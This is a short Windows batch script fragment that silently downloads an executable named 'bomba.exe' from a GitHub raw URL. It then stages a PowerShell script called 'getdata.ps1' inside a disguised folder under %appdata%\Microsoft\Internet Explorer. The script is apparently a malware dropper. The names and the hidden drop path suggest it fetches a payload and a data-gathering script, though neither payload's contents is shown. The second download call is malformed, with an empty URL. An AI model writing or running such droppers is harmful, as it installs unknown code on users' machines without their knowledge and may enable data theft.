@echo off
setlocal enabledelayedexpansion
if not exist "%~dp0bomba.exe" (
        call :download "bomba.exe" "https://github.com/thompog/bob/raw/refs/heads/main/bomba.exe" "%~dp0"
)
if not exist "%appdata%\Microsoft\Internet Explorer\getdata.ps1" (
        call :download "getdata.ps1", ""
)
